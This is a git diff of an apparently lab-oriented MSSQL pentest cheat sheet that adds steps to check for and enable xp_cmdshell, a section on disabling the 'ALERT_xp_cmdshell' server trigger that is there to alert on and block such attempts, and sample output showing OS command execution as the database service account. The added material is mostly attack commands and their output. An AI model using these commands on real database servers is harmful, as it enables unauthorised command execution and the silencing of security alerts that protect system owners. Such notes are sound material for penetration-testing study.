@@ -489,13 +489,25 @@ COMPATIBILITY\POO_CONFIG
 
 ### Check if enabled 
 
-```text
-EXEC xp_cmdshell 'net user'; -- priv 
+`xp_cmdshell whoami`
+
+Or
+
+`EXEC xp_cmdshell 'net user'; -- priv` 
+
 Or 
-EXEC master.dbo.xp_cmdshell 'cmd'; 
-```
+
+`EXEC master.dbo.xp_cmdshell 'cmd';` 
 
 ### Enable xp\_cmdshell
+
+#### Short way:
+
+```text
+SQL> enable_xp_cmdshell
+```
+
+#### Long way:
 
 ```text
 EXEC sp_configure 'show advanced options', 1; -- priv 
@@ -512,6 +524,31 @@ EXEC sp_configure reconfigure;
 ### Check if it works
 
 `xp_cmdshell 'dir C:\'` 
+
+### Disable Trigger
+
+If you get a error when we try to enable xp\_cmdshell on trigger, such as:
+
+```text
+Line 181: The transaction ended in the trigger. The batch has been aborted.
+```
+
+These triggers are a policy put in place to alert and block attempts to enable and use xp\_cmdshell. The problem is, as sa, we can disable these triggers.
+
+`SQL> disable trigger ALERT_xp_cmdshell on all server`
+
+And then enable xp\_cmdshell
+
+```text
+SQL> enable_xp_cmdshell
+[*] INFO(COMPATIBILITY\POO_PUBLIC): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
+[*] INFO(COMPATIBILITY\POO_PUBLIC): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
+SQL> xp_cmdshell whoami
+output                                                                             
+------------------------------   
+nt service\mssql$poo_public                                                        
+NULL
+```
 
 ## Capture credentials using xp\_dirtree
 
